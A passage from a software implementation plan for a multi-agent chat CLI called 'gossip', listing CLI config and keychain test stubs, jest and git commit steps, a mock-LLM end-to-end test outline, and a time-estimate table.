// If config exists → start chat
// Boot relay (local), tool server, main agent, workers
```

- [ ] **Step 5b: Write config and keychain tests**

```typescript
// tests/cli/config.test.ts
import { loadConfig, validateConfig } from '../../../apps/cli/src/config';

describe('Config', () => {
  it('parses valid gossip.agents.yaml', () => { /* ... */ });
  it('rejects missing main_agent field', () => {
    expect(() => validateConfig({})).toThrow('main_agent is required');
  });
  it('rejects invalid provider name', () => { /* ... */ });
  it('rejects agents with no skills', () => { /* ... */ });
});

// tests/cli/keychain.test.ts
describe('Keychain', () => {
  it('falls back to in-memory when keychain unavailable', () => {
    // Mock keychain access denied → expect warning + in-memory storage
  });
});
```

- [ ] **Step 5c: Run CLI tests**

Run: `npx jest tests/cli/ --no-coverage`
Expected: PASS

- [ ] **Step 6: Verify CLI boots and runs**

Run: `npx ts-node apps/cli/src/index.ts`
Expected: Setup wizard runs (first time) or chat opens.

- [ ] **Step 7: Commit**

```bash
git add apps/cli/ gossip.agents.yaml.example
git commit -m "feat(cli): gossip chat interface with setup wizard

- Interactive chat REPL
- First-run setup wizard (API keys, model selection, team config)
- OS keychain integration for secure key storage
- gossip.agents.yaml config loading and validation"
```

---

## Task 8: E2E Integration Test

**Files:**
- Create: `tests/e2e/full-flow.test.ts`

- [ ] **Step 1: Write E2E test**

```typescript
// tests/e2e/full-flow.test.ts
// Boot relay, tool server, main agent with mock LLM, worker with mock LLM.
// Send "read src/index.ts and suggest improvements"
// Verify: main agent dispatches to worker, worker calls file_read tool,
// worker calls mock LLM with file contents, result flows back to main agent.
```

This test uses mock LLM providers (return canned responses) to avoid real API calls.

- [ ] **Step 2: Run E2E test**

Run: `npx jest tests/e2e/ --no-coverage`
Expected: PASS

- [ ] **Step 3: Run full test suite**

Run: `npm test`
Expected: All tests pass across all packages.

- [ ] **Step 4: Commit**

```bash
git add tests/e2e/
git commit -m "test(e2e): full flow — chat → relay → agent → tools → result

Verifies the complete pipeline with mock LLM providers."
```

- [ ] **Step 5: Push to remote**

```bash
git push -u origin master
```

---

## Summary

| Task | Package | Type | Est. CC Time |
|------|---------|------|-------------|
| 1 | workspace | Scaffolding | 15 min |
| 2 | @gossip/types | Port + fix | 30 min |
| 3 | @gossip/relay | Port routing + rewrite server | 45 min |
| 4 | @gossip/client | Merge implementations | 30 min |
| 5 | @gossip/tools | New (file/shell/git/sandbox) | 45 min |
| 6 | @gossip/orchestrator | New (main agent, workers, LLM) | 60 min |
| 7 | apps/cli | New (chat, wizard, config) | 30 min |
| 8 | E2E test | Integration | 15 min |
| **Total** | | | **~4.5 hours** |
